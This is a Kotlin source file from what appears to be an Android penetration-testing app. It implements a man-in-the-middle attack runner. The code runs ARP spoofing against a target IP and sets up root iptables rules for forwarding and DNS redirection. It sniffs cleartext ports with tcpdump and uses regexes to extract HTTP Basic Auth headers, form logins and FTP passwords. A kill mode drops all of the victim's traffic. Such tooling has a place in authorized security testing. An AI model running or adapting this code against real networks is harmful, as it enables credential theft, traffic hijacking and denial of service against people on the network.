package org.csploit.strix.data

import kotlinx.coroutines.flow.Flow
import org.csploit.strix.core.Logger
import org.csploit.strix.core.ProcessEvent
import org.csploit.strix.core.ProcessManager
import java.io.File
import javax.inject.Inject
import javax.inject.Singleton

enum class MitmMode {
    SNIFFER,
    DNS_SPOOF,
    KILL,
}

data class DnsEntry(
    val hostname: String,
    val address: String,
)

/**
 * Orchestrates MITM attacks on Android 13+.
 *
 * Android 13 forwarding requires (discovered empirically on Samsung A12):
 *   - ndc ipfwd enable (not sysctl — netd reverts sysctl)
 *   - iptables -F tetherctrl_FORWARD (removes DROP-all rule that blocks forwarding)
 *     NOTE: do NOT flush the entire filter table (-F) — breaks Android networking
 *     NOTE: do NOT flush raw table (-t raw -F) — removes BPF rules permanently
 *   - iptables -P FORWARD ACCEPT
 *   - iptables -t nat MASQUERADE
 *   - ip route default (Android without SIM may lack default route)
 *   - send_redirects=0 (kernel sends ICMP redirects instead of forwarding)
 *   - ip rule iif wlan0 pref 31500 (Android rule 32000:unreachable drops forwarded pkts)
 *
 * Each command must run as a separate su -c call (single shell scripts don't
 * apply iptables/ndc changes correctly on KernelSU).
 */
@Singleton
class MitmRunner @Inject constructor(
    private val processManager: ProcessManager,
    private val toolManager: ToolManager,
    private val networkManager: NetworkManager,
) {

    fun exec(command: String): Flow<ProcessEvent> {
        return processManager.execute(command = command)
    }

    /**
     * Setup commands — each executed as a separate su -c call.
     * In DNS_SPOOF mode we also need to REDIRECT victim's DNS traffic to
     * our local Kotlin DnsSpoofServer; the PREROUTING rule is added on top
     * of the forwarding setup so the query never reaches the real gateway.
     */
    fun getSetupCommands(mode: MitmMode = MitmMode.SNIFFER): List<String> {
        val net = networkManager.detectNetwork()
            ?: error("No WiFi network detected")
        val iface = net.interfaceName
        val gateway = net.gatewayIp

        val base = mutableListOf(
            "ndc ipfwd enable strix",
            "echo 1 > /proc/sys/net/ipv4/ip_forward",
            "iptables -F tetherctrl_FORWARD",              // remove DROP-all (surgical, not -F)
            "iptables -P FORWARD ACCEPT",
            "iptables -t nat -I POSTROUTING -s 0/0 -j MASQUERADE",
            "ip route add default via $gateway dev $iface 2>/dev/null; true",
            "echo 0 > /proc/sys/net/ipv4/conf/all/send_redirects; echo 0 > /proc/sys/net/ipv4/conf/$iface/send_redirects",
            "ip rule add iif $iface lookup $iface pref 31500 2>/dev/null; true",
        )
        if (mode == MitmMode.DNS_SPOOF) {
            base.add(
                "iptables -t nat -I PREROUTING -i $iface -p udp --dport 53 " +
                    "-j REDIRECT --to-ports ${DnsSpoofServer.DEFAULT_PORT}"
            )
        }
        return base
    }

    /**
     * Start arpspoof (long-running, absolute path, no ProcessManager prefix).
     */
    fun startArpSpoof(targetIp: String): Flow<ProcessEvent> {
        val net = networkManager.detectNetwork()
            ?: error("No WiFi network detected")

        return processManager.execute(
            command = "${toolManager.toolsPath}bin/arpspoof -i ${net.interfaceName} -t $targetIp ${net.gatewayIp}",
        )
    }

    /**
     * Start tcpdump credential sniffer (absolute path).
     */
    fun startCredentialSniffer(targetIp: String): Flow<ProcessEvent> {
        val net = networkManager.detectNetwork()
            ?: error("No WiFi network detected")

        return processManager.execute(
            command = "${toolManager.toolsPath}bin/tcpdump -i ${net.interfaceName} -A -l -s 0 " +
                "'host $targetIp and (port 80 or port 21 or port 23 or port 25 or port 110 or port 143 or port 8080)'",
        )
    }

    /**
     * DNS spoofing on Android is handled by the native Kotlin DnsSpoofServer,
     * not by ettercap. See DnsSpoofServer.kt for rationale (ettercap's
     * dns_spoof plugin needs either -M arp:remote — whose ARP poisoner thread
     * deadlocks on bionic — or active mode to send replies, neither of which
     * works reliably out of the box on Android). The server is wired directly
     * from MitmViewModel; this class only ships the iptables rule that diverts
     * victim traffic to the server.
     */

    /**
     * Drop traffic being forwarded to/from the victim, killing their
     * connectivity while we keep poisoning their ARP. REJECT with
     * tcp-reset produces an immediate RST that tears down existing TCP
     * sessions; DROP catches everything else (UDP, ICMP). Pass enable=false
     * with the same target to remove the rules.
     */
    fun getKillCommands(targetIp: String, enable: Boolean): List<String> {
        val op = if (enable) "-I" else "-D"
        return listOf(
            "iptables $op FORWARD -s $targetIp -p tcp -j REJECT --reject-with tcp-reset 2>/dev/null; true",
            "iptables $op FORWARD -d $targetIp -p tcp -j REJECT --reject-with tcp-reset 2>/dev/null; true",
            "iptables $op FORWARD -s $targetIp -j DROP 2>/dev/null; true",
            "iptables $op FORWARD -d $targetIp -j DROP 2>/dev/null; true",
        )
    }

    /**
     * Cleanup commands — undo only what we changed.
     */
    fun getCleanupCommands(mode: MitmMode = MitmMode.SNIFFER): List<String> {
        val net = networkManager.detectNetwork()
        val iface = net?.interfaceName ?: "wlan0"
        val base = mutableListOf(
            "ndc ipfwd disable strix",
            "ip rule del iif $iface lookup $iface pref 31500 2>/dev/null; true",
            "iptables -t nat -D POSTROUTING -s 0/0 -j MASQUERADE 2>/dev/null; true",
        )
        if (mode == MitmMode.DNS_SPOOF) {
            base.add(
                "iptables -t nat -D PREROUTING -i $iface -p udp --dport 53 " +
                    "-j REDIRECT --to-ports ${DnsSpoofServer.DEFAULT_PORT} 2>/dev/null; true"
            )
        }
        return base
    }

    private fun writeDnsEntries(entries: List<DnsEntry>) {
        val etterDir = File(toolManager.toolsPath, "etc/ettercap")
        val dnsFile = File(etterDir, "etter.dns")
        val content = buildString {
            appendLine("# Generated by Strix — DNS spoof entries")
            for (entry in entries) {
                appendLine("${entry.hostname}\tA\t${entry.address}")
                appendLine("${entry.hostname}\tPTR\t${entry.address}")
            }
        }
        dnsFile.writeText(content)
        dnsFile.setReadable(true, false)
    }

    companion object {
        val BASIC_AUTH_REGEX = Regex(
            """Authorization:\s*Basic\s+(\S+)""", RegexOption.IGNORE_CASE
        )
        val POST_CRED_REGEX = Regex(
            """(?:user(?:name)?|login|email)=([^&\s]+).*?(?:pass(?:word)?|pwd)=([^&\s]+)""",
            RegexOption.IGNORE_CASE,
        )
        val FTP_REGEX = Regex(
            """^(USER|PASS)\s+(.+)""", RegexOption.IGNORE_CASE
        )
    }
}
